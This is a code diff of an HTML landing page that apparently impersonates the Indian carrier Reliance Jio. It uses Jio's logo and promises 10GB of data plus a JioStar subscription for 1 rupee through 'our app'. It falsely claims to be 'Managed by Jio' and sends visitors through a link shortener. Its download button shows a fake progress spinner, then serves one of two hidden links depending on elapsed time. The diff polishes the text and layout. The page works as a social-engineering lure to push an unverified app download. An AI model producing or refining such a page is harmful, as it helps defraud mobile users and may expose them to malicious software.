@@ -1,22 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Get 10GB Data + JioStar Subcriptionn free at Just 1₹.">
+    <meta name="description" content="Get 10GB Data + JioStar Subscription free at Just 1₹.">
     <meta property="og:title" content="Download PlanVoucher">
-    <meta property="og:description" content="Get 10GB Data + JioStar Subcriptionn free at Just 1₹. Only avaiable on our app.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png"> <!-- Replace with your image URL -->
+    <meta property="og:description"
+        content="Get 10GB Data + JioStar Subscription free at Just 1₹. Only available on our app.">
+    <meta property="og:image"
+        content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png">
     <meta property="og:url" content="https://rebrand.ly/Jio-4G">
     <title>Jio Services</title>
     <link rel="icon" href="favicon.ico" type="image/x-icon">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Roboto:wght@400;500&display=swap"
+        rel="stylesheet">
     <style>
         body {
             margin: 0;
             font-family: 'Roboto', sans-serif;
             background-color: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
+
         header {
             background-color: #0A4BBA;
             color: white;
@@ -27,10 +35,26 @@
             font-size: 1.2rem;
             font-weight: 600;
         }
+
         header img {
             height: 45px;
             margin-right: 8px;
         }
+
+        .b2card {
+            width: 120px;
+            height: 1px;
+            background-color: #0A4BBA;
+            border-radius: 10px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.9rem;
+            padding: 10px;
+            margin-top: 1rem;
+        }
+
         .container {
             max-width: 90%;
             margin: 2rem auto;
@@ -39,7 +63,10 @@
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
             text-align: center;
+            flex: 1;
+            /* Makes the container take up available space */
         }
+
         .container h1 {
             font-size: 1.8rem;
             color: #333;
@@ -51,15 +78,18 @@
             color: #333;
             font-family: 'Poppins', sans-serif;
         }
+
         .container p {
             font-size: 1rem;
             color: #666;
             margin: 1rem 0;
         }
+
         .features {
             text-align: center;
             margin: 1rem 0;
         }
+
         .features ul {
             list-style: none;
             padding: 0;
@@ -67,19 +97,22 @@
             text-align: left;
             max-width: 300px;
         }
+
         .features ul li {
             display: flex;
             align-items: center;
             margin-bottom: 0.9rem;
-            font-size: 0.9rem;
+            font-size: 95%;
             color: #555;
         }
+
         .features ul li::before {
             content: '\2713';
             color: #0A4BBA;
             font-weight: bold;
             margin-right: 0.5rem;
         }
+
         .download-button {
             display: inline-block;
             background-color: #0A4BBA;
@@ -94,16 +127,29 @@
             width: 50%;
             max-width: 150px;
         }
+
         .download-button:hover {
             background-color: #083D93;
         }
+
         footer {
             text-align: center;
             padding: 1rem;
             background-color: #0A4BBA;
             color: white;
-            margin-top: 2rem;
+            margin-top: auto;
+            width: 100%;
+            box-sizing: border-box;
+            font-size: 0.8rem;
+            /* Reduced font size for footer */
         }
+
+        footer b {
+            font-weight: bold;
+            font-size: 0.9rem;
+            /* Adjusted bold text size */
+        }
+
         #progressModal {
             display: none;
             position: fixed;
@@ -115,6 +161,7 @@
             justify-content: center;
             align-items: center;
         }
+
         .progress-container {
             width: 80%;
             max-width: 250px;
@@ -127,6 +174,7 @@
             justify-content: center;
             gap: 10px;
         }
+
         .progress-spinner {
             border: 5px solid #f3f3f3;
             border-top: 5px solid #0A4BBA;
@@ -135,39 +183,54 @@
             height: 40px;
             animation: spin 1.5s linear infinite;
         }
+
         .progress-text {
             color: #333;
             font-size: 1rem;
             font-family: 'Roboto', sans-serif;
         }
+
         @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
+
         @media (max-width: 768px) {
             header {
                 font-size: 1rem;
             }
+
             header img {
                 height: 25px;
                 margin-right: 5px;
             }
-            .container h1,h4 {
+
+            .container h1,
+            h4 {
                 font-size: 1.5rem;
             }
+
             .container p {
                 font-size: 0.9rem;
             }
+
             .features ul li {
                 font-size: 0.85rem;
             }
         }
     </style>
 </head>
+
 <body>
     <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png" height="180"/>
-        <span>Jio Vouchers</span>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png"
+            height="180" />
+        <span>Vouchers</span>
     </header>
     <div class="container">
         <h1>Get exclusive Jio offers from here</h1>
@@ -183,13 +246,9 @@
         <a id="downloadButton" href="#" class="download-button">Download Now</a>
     </div>
     <footer>
-        &copy; 2025 PlanVoucher. All Rights Reserved.
-        <div class="b2card"></div>
-        <br>
-            Website Content Managed by <b>Jio</b>
-            <br><br>
-            Last Updated On: January 08, 2025
-        </div>
+        &copy; 2025 PlanVoucher. All Rights Reserved.<br>
+        Website Content Managed by <b>Jio</b><br>
+        Last Updated On: January 08, 2025
     </footer>
 
     <div id="progressModal">
@@ -210,7 +269,7 @@
         document.getElementById("downloadButton").addEventListener("click", function (event) {
             event.preventDefault();
             progressModal.style.display = "flex";
-            setTimeout(function() {
+            setTimeout(function () {
                 const currentTime = new Date().getTime();
                 const elapsedMinutes = (currentTime - startTime) / (1000 * 60);
                 const downloadLink = elapsedMinutes <= 30 ? firstLink : secondLink;
@@ -220,4 +279,5 @@
         });
     </script>
 </body>
+
 </html>
